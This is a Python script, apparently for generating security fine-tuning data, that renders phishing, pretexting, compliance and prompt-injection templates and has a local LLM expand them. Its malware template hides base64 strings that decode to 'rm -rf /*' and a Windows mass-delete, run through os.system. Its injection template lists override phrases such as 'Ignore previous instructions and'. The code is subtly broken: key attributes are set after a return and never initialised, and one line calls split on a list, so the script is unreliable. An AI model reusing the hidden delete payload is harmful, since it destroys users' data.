#!/usr/bin/env python3

import json
import logging
import pandas as pd
import yaml
from pathlib import Path
from typing import Dict, List, Optional, Union, Tuple
from datetime import datetime
import random
import re
import hashlib
from jinja2 import Template
import argparse
import time
from tqdm import tqdm

# Import MLX client
from mlx_client import MLXClient

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SecurityAligner:
    def __init__(self, input_dir: str, output_dir: str, config_path: str = "pipeline_config.yaml", disable_llm: bool = False):
        self.input_dir = Path(input_dir)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Load configuration
        self.config = self._load_config(config_path)
        
        if not disable_llm:
            # Initialize MLX client
            self.mlx_client = MLXClient(
                server_url=self.config["mlx_server"]["base_url"],
                model_path=self.config["mlx_model"]["path"],
                batch_size=self.config["batching"]["batch_size"],
                batch_timeout_ms=self.config["batching"]["batch_timeout_ms"],
                use_server=self.config["mlx_server"]["use_server"],
                max_retries=self.config["mlx_server"]["max_retries"]
            )
            self.llm_available = True
            logger.info(f"MLX client initialized in {self.mlx_client.mode} mode")
        else:
            self.mlx_client = None
            self.llm_available = False
            logger.warning("LLM enhancement disabled.")
    
    def _load_config(self, config_path: str) -> Dict:
        """Load pipeline configuration"""
        try:
            with open(config_path, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.warning(f"Failed to load config from {config_path}: {e}")
            # Return default configuration
            return {
                "mlx_server": {"base_url": "http://localhost:8080", "use_server": True, "max_retries": 3},
                "mlx_model": {"path": "mlx-community/Phi-3-mini-4k-instruct-4bit"},
                "batching": {"batch_size": 16, "batch_timeout_ms": 100},
                "pipeline": {
                    "security_aligner": {"max_tokens": 1500, "temperature": 0.8}
                }
            }

        self.template_categories = {'phishing': self._load_phishing_templates(), 'malware': self._load_malware_templates(), 'social_engineering': self._load_social_engineering_templates(), 'compliance': self._load_compliance_templates(), 'adversarial': self._load_adversarial_templates()}
        self.security_flags = {'high_risk': {'description': 'Contains potentially harmful content', 'review_required': True, 'isolation_required': True}, 'medium_risk': {'description': 'Contains suspicious patterns', 'review_required': True, 'isolation_required': False}, 'compliance_check': {'description': 'Tests compliance handling', 'review_required': True, 'isolation_required': False}}

    # ... All _load_*_templates and generate_* methods remain the same ...
    def _load_phishing_templates(self): return {'email': [{'template': "Instruction: How would you respond to this urgent email from {{ company }}?\n\nFrom: accounts@{{ company }}.{{ tld }}\nSubject: Urgent: Account Security Alert\nMessage: Dear valued customer,\n\nOur security system has detected unusual activity on your account. To prevent unauthorized access, please verify your identity immediately by clicking the following link:\n\n{{ verification_link }}\n\nIf you don't verify within 24 hours, your account will be suspended.\n\nSecurity Department\n{{ company }}", 'variables': {'company': ['PayPal', 'Amazon', 'Microsoft', 'Apple'], 'tld': ['com', 'net', 'org'], 'verification_link': ['http://security-verify.{{ random_string }}.com/verify', 'https://account-verify.{{ random_string }}.net/secure']}, 'risk_level': 'high_risk'}]}
    def _load_malware_templates(self): return {'code_samples': [{'template': "Instruction: Analyze this suspicious code snippet for potential security risks:\n\n```python\nimport os\nimport base64\n\ndef {{ function_name }}():\n    {{ payload_var }} = base64.b64decode('{{ encoded_payload }}')\n    try:\n        {{ execution_var }} = __import__('os').system\n        {{ execution_var }}({{ payload_var }}.decode())\n    except:\n        pass\n```", 'variables': {'function_name': ['update_service', 'check_system', 'verify_security'], 'payload_var': ['data', 'content', 'payload'], 'execution_var': ['exec', 'run', 'execute'], 'encoded_payload': ['cm0gLXJmIC8q', 'ZGVsIC9mIC9xIC9z']}, 'risk_level': 'high_risk'}]}
    def _load_social_engineering_templates(self): return {'pretexting': [{'template': "Instruction: How would you verify the legitimacy of this IT support request?\n\nFrom: it.support@{{ company_domain }}\nSubject: Urgent System Update Required\nMessage: Hello {{ employee_name }},\n\nThis is {{ sender_name }} from IT Support. We've detected that your system is missing critical security updates. To prevent any security breaches, please provide your login credentials so we can install the updates remotely.\n\nBest regards,\n{{ sender_name }}\nIT Support", 'variables': {'company_domain': ['company.com', 'enterprise.org', 'corp.net'], 'employee_name': ['User', 'Employee', 'Team Member'], 'sender_name': ['John Smith', 'Mike Johnson', 'Sarah Wilson']}, 'risk_level': 'medium_risk'}]}
    def _load_compliance_templates(self): return {'data_handling': [{'template': "Instruction: How should you handle this sensitive data request?\n\nRequest Type: {{ request_type }}\nData Requested: {{ data_type }}\nPurpose: {{ purpose }}\nRequestor: {{ requestor }}", 'variables': {'request_type': ['Export', 'Transfer', 'Access'], 'data_type': ['PII', 'Financial Records', 'Medical Records', 'Customer Data'], 'purpose': ['Audit', 'Analysis', 'Investigation'], 'requestor': ['External Auditor', 'Third-party Vendor', 'Unknown Source']}, 'risk_level': 'compliance_check'}]}
    def _load_adversarial_templates(self): return {'prompt_injection': [{'template': "Instruction: {{ prefix }} {{ command }}\n\nResponse: I cannot assist with potentially harmful activities. This request appears to be an attempt at {{ attack_type }}. Instead, I can provide information about secure practices and ethical guidelines.", 'variables': {'prefix': ['Ignore previous instructions and', 'Disregard security protocols and', 'Override safety checks to'], 'command': ['execute the following system commands', 'provide unauthorized access to', 'bypass security measures for'], 'attack_type': ['prompt injection', 'security bypass', 'unauthorized access']}, 'risk_level': 'medium_risk'}]}
    def generate_random_string(self, length: int = 8): return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(length))
    def generate_random_ip(self): return '.'.join(str(random.randint(1, 255)) for _ in range(4))
    def generate_random_digits(self, length: int = 7): return ''.join(str(random.randint(0, 9)) for _ in range(length))

    def render_template(self, template_data: Dict) -> Tuple[str, Dict]:
        template = Template(template_data['template'])
        variables = {}
        for var_name, var_values in template_data['variables'].items():
            value = random.choice(var_values)
            if '{{ random_string }}' in value: value = value.replace('{{ random_string }}', self.generate_random_string())
            elif '{{ random_ip }}' in value: value = value.replace('{{ random_ip }}', self.generate_random_ip())
            elif '{{ random_digits }}' in value: value = value.replace('{{ random_digits }}', self.generate_random_digits())
            variables[var_name] = value
        
        rendered_text = template.render(**variables)
        security_metadata = self.security_flags[template_data['risk_level']]
        return rendered_text, security_metadata

    def generate_security_examples(self, category: str, count: int = 1) -> List[Dict]:
        examples = []
        if category not in self.template_categories: return examples
        for _ in range(count):
            subcategory = random.choice(list(self.template_categories[category].keys()))
            template_data = random.choice(self.template_categories[category][subcategory])
            content, security_metadata = self.render_template(template_data)
            
            instruction = content.split('Instruction: ').split('Response: ').strip()
            response = content.split('Response: ').strip() if 'Response: ' in content else ''
            
            examples.append({'instruction': instruction, 'response': response, 'metadata': {'category': category, 'subcategory': subcategory, 'security_flags': security_metadata, 'generation_timestamp': datetime.now().isoformat(), 'template_hash': hashlib.sha256(template_data['template'].encode()).hexdigest()}})
        return examples

    def load_data(self, file_path: Path) -> List[Dict]:
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            if isinstance(data, dict) and 'data' in data:
                return data['data']
            return data if isinstance(data, list) else []
        except Exception as e:
            logger.error(f"Error loading file {file_path}: {e}")
            return []

    def enhance_with_llm(self, entry: Dict) -> Dict:
        if not isinstance(entry, dict): return entry
        instruction = entry.get('instruction', '')
        orig_response = entry.get('response', '')
        category = entry.get('metadata', {}).get('category', 'general cybersecurity')

        prompt = f"""[INST]
Enhance this cybersecurity instruction-response pair to be more detailed and educational. For the category '{category}', add relevant technical details and best practices. Return a single JSON object with "enhanced_instruction" and "enhanced_response" fields, and nothing else.
Original Instruction: {instruction}
Original Response: {orig_response}
[/INST]"""
        
        try:
            # Get configuration for security aligner
            config = self.config["pipeline"]["security_aligner"]
            response = self.mlx_client.generate(
                prompt,
                max_tokens=config.get("max_tokens", 1500),
                temperature=config.get("temperature", 0.8)
            )
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                enhanced_data = json.loads(json_match.group(0))
                entry['instruction'] = enhanced_data.get('enhanced_instruction', instruction)
                entry['response'] = enhanced_data.get('enhanced_response', orig_response)
                entry.setdefault('metadata', {})['enhancement_timestamp'] = datetime.now().isoformat()
        except Exception as e:
            logger.error(f"Could not enhance entry due to error: {e}")
        
        return entry
    
    def enhance_entries_batch(self, entries: List[Dict]) -> List[Dict]:
        """Enhance multiple entries using batch processing"""
        prompts = []
        for entry in entries:
            if not isinstance(entry, dict): 
                prompts.append("")
                continue
            instruction = entry.get('instruction', '')
            orig_response = entry.get('response', '')
            category = entry.get('metadata', {}).get('category', 'general cybersecurity')
            
            prompt = f"""[INST]
Enhance this cybersecurity instruction-response pair to be more detailed and educational. For the category '{category}', add relevant technical details and best practices. Return a single JSON object with "enhanced_instruction" and "enhanced_response" fields, and nothing else.
Original Instruction: {instruction}
Original Response: {orig_response}
[/INST]"""
            prompts.append(prompt)
        
        try:
            # Get batch responses
            config = self.config["pipeline"]["security_aligner"]
            responses = self.mlx_client.generate_batch(
                prompts,
                max_tokens=config.get("max_tokens", 1500),
                temperature=config.get("temperature", 0.8)
            )
            
            # Process responses
            for entry, response in zip(entries, responses):
                if not isinstance(entry, dict):
                    continue
                try:
                    json_match = re.search(r'\{.*\}', response, re.DOTALL)
                    if json_match:
                        enhanced_data = json.loads(json_match.group(0))
                        entry['instruction'] = enhanced_data.get('enhanced_instruction', entry.get('instruction', ''))
                        entry['response'] = enhanced_data.get('enhanced_response', entry.get('response', ''))
                        entry.setdefault('metadata', {})['enhancement_timestamp'] = datetime.now().isoformat()
                except:
                    pass  # Keep original entry if enhancement fails
                    
        except Exception as e:
            logger.error(f"Error during batch enhancement: {e}")
            
        return entries

    def process_directory(self, security_example_ratio: float = 0.2):
        input_files = [p for p in self.input_dir.glob('*_reviewed_*.json')]
        logger.info(f"Found {len(input_files)} reviewed files to process.")

        for file_path in input_files:
            logger.info(f"Processing {file_path.name}")
            data = self.load_data(file_path)
            if not data: continue

            num_security_examples = int(len(data) * security_example_ratio)
            security_examples = []
            if num_security_examples > 0:
                for category in self.template_categories:
                    examples = self.generate_security_examples(category, count=max(1, num_security_examples // len(self.template_categories)))
                    security_examples.extend(examples)
            
            aligned_data = data + security_examples
            enhanced_data = []

            if self.llm_available:
                # Process in batches for better performance
                batch_size = self.config["batching"]["batch_size"]
                
                for i in tqdm(range(0, len(aligned_data), batch_size), desc=f"Aligning {file_path.name} (batched)"):
                    batch = aligned_data[i:i + batch_size]
                    enhanced_batch = self.enhance_entries_batch(batch)
                    enhanced_data.extend(enhanced_batch)
            else:
                logger.info("LLM is disabled. Skipping enhancement step.")
                enhanced_data = aligned_data
            
            random.shuffle(enhanced_data)
            self.save_data(enhanced_data, file_path)

    def save_data(self, data: List[Dict], original_file: Path):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        base_name = original_file.stem.replace('_reviewed_', '_')
        output_file = self.output_dir / f"{base_name}_aligned_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        logger.info(f"Saved {len(data)} aligned entries to {output_file}")
    
    def close(self):
        """Close the MLX client"""
        if self.mlx_client:
            self.mlx_client.close()

def main():
    parser = argparse.ArgumentParser(description='Align and enhance a dataset with security-focused examples using MLX with advanced server support.')
    parser.add_argument('--input-dir', default='reviewed_data', help='Input directory with reviewed data.')
    parser.add_argument('--output-dir', default='security_aligned', help='Output directory for the final dataset.')
    parser.add_argument('--ratio', type=float, default=0.2, help='Ratio of generated security examples to add.')
    parser.add_argument('--config', type=str, default="pipeline_config.yaml", help="Path to pipeline configuration file.")
    parser.add_argument("--disable-llm", action="store_true", help="Disable LLM enhancement.")
    args = parser.parse_args()
    
    aligner = SecurityAligner(
        input_dir=args.input_dir, 
        output_dir=args.output_dir, 
        config_path=args.config,
        disable_llm=args.disable_llm
    )
    aligner.process_directory(security_example_ratio=args.ratio)
    aligner.close()

if __name__ == "__main__":
    main()